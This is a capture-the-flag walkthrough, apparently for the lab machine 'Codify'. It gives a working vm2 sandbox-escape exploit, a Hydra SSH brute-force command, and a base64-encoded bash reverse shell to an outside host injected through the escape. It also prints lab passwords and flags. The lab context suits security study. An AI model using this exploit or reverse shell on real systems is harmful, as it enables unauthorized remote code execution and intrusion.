# Codify

## Initial Scan

```nmap
sudo nmap -T4 -v 10.129.82.199
sudo nmap -T4 -Pn -p 22,80,3000 -sV -sC -v 10.129.82.199 -oA Codify
```

<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

## HTTP

Had to edit the host file to get the Webpage

<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

Checking out their About Us page

<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

Looking around for VM2 CVE's, found [this article on snyk](https://security.snyk.io/vuln/SNYK-JS-VM2-5537100) about RCE with VM2 after seeing a couple others. Testing the other PoC's I didn't get anywhere until I found this one. We can run commands on the host bypassing the VM.

```javascript
const { VM } = require("vm2");
const vm = new VM();

const code = `
  const err = new Error();
  err.name = {
    toString: new Proxy(() => "", {
      apply(target, thiz, args) {
        const process = args.constructor.constructor("return process")();
        throw process.mainModule.require("child_process").execSync("ls -al").toString();
      },
    }),
  };
  try {
    err.stack;
  } catch (stdout) {
    stdout;
  }
`;

console.log(vm.run(code)); // -> hacked
```

<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

whoami shows us the `svc` user. Also looking at `/etc/passwd` we see an additional user, `joshua`&#x20;

<figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

### BruteForce

Trying to run Hydra against the user joshua for a password

```bash
hydra -l joshua -P /usr/share/wordlists/rockyou.txt -V ssh://10.129.82.199
```

<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

`joshua:spongebob1`

### Obtaining shell

Working to get a shall as svc. Looking around for reverse shell, I found [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#bash-tcp).

```bash
bash -i >& /dev/tcp/10.10.14.53/1234 0>&1
```

Running it normally didn't work so I encoded it

```
echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC41My8xMjM0IDA+JjE=' | base64 -d | bash"
```

Full command

```bash
const { VM } = require("vm2");
const vm = new VM();

const code = `
  const err = new Error();
  err.name = {
    toString: new Proxy(() => "", {
      apply(target, thiz, args) {
        const process = args.constructor.constructor("return process")();
        throw process.mainModule.require("child_process").execSync("echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC41My8xMjM0IDA+JjE=' | base64 -d | bash").toString();
      },
    }),
  };
  try {
    err.stack;
  } catch (stdout) {
    stdout;
  }
`;

console.log(vm.run(code)); // -> hacked
```

## Foothold

We have shell as svc

<figure><img src="../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

Seeing what permissions we have

<figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

## User Flag

After getting into shell from the SVC user, I got Joshuas password with hydra.

<figure><img src="../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

User flag: `c53cdd4688463871ba3f4020ab6f3ccb`

## Priv Esc

<figure><img src="../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

We have run the note of "User joshua may run the following commands on codify: (root) /opt/scripts/mysql-backup.sh" So looking at the shell file

<figure><img src="../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

Running that as root as get

<figure><img src="../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

Get [PSPY](https://github.com/DominicBreuker/pspy) Initiate another SSH session. Get pspy64 onto the target machine, run it, then run the `/opt/scripts/mysql-backup.sh` script

<figure><img src="../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>

Root pass: `kljh12k3jhaskjh12kjh3`

<figure><img src="../../.gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>

Root flag: `4e43f866588b3b3433196af3cef8b768`
